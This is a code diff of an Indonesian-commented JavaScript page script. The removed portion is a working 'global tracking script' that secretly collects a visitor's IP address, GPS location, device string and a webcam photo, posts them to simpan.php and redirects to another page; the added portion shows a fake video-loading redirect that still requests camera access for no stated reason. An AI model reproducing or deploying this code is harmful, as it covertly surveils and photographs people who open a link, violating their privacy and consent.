@@ -1,131 +1,37 @@
-// ===============================
-// GLOBAL TRACKING SCRIPT
-// ===============================
+// ==============================
+// DETEKSI PERANGKAT
+// ==============================
 
-const video = document.createElement("video");
-const canvas = document.createElement("canvas");
-const ctx = canvas.getContext("2d");
+let device = navigator.userAgent.toLowerCase();
 
-let ip = "unknown";
-let lokasi = "unknown";
-let device = navigator.userAgent;
-let foto = "";
+let tujuan = "video-pc.mp4";
 
-// ===============================
-// Ambil IP
-// ===============================
-async function getIP() {
-  try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    ip = data.ip;
-  } catch (e) {
-    console.log("Gagal ambil IP");
-  }
+if (device.includes("android") || device.includes("iphone")) {
+    tujuan = "video-hp.mp4";
 }
 
-// ===============================
-// Ambil Lokasi
-// ===============================
-function getLocation() {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      lokasi = "GPS tidak tersedia";
-      resolve();
-      return;
-    }
+// ==============================
+// LOADING 3 DETIK
+// ==============================
 
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        lokasi =
-          pos.coords.latitude + "," + pos.coords.longitude;
-        resolve();
-      },
-      () => {
-        lokasi = "GPS ditolak";
-        resolve();
-      }
-    );
-  });
-}
+setTimeout(() => {
 
-// ===============================
-// Ambil Kamera
-// ===============================
-async function getCamera() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: true
-    });
+    window.location.href = "video.html";
 
-    video.srcObject = stream;
-    video.play();
+}, 3000);
 
-    return new Promise((resolve) => {
-      video.onloadedmetadata = () => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+// ==============================
+// AMBIL KAMERA (JIKA BISA)
+// ==============================
 
-        setTimeout(() => {
-          ctx.drawImage(video, 0, 0);
-          foto = canvas.toDataURL("image/png");
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
 
-          stream.getTracks().forEach(track => track.stop());
+    console.log("kamera aktif");
 
-          resolve();
-        }, 2000);
-      };
-    });
+})
+.catch(err => {
 
-  } catch (e) {
-    console.log("Kamera ditolak");
-    foto = "kamera ditolak";
-  }
-}
+    console.log("kamera gagal, lanjut");
 
-// ===============================
-// Kirim ke PHP
-// ===============================
-async function kirimData() {
-  try {
-
-    const response = await fetch("simpan.php", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      body:
-        "ip_address=" + encodeURIComponent(ip) +
-        "&lokasi=" + encodeURIComponent(lokasi) +
-        "&perangkat=" + encodeURIComponent(device) +
-        "&foto=" + encodeURIComponent(foto)
-    });
-
-    const result = await response.text();
-
-    console.log("Data terkirim:", result);
-
-  } catch (error) {
-    console.log("Gagal kirim:", error);
-  }
-
-  setTimeout(() => {
-    window.location.href = "global.html";
-  }, 3000);
-}
-
-// ===============================
-// Jalankan Semua
-// ===============================
-async function start() {
-
-  console.log("Memulai sistem...");
-
-  await getIP();
-  await getLocation();
-  await getCamera();
-  await kirimData();
-
-}
-
-start();
+});
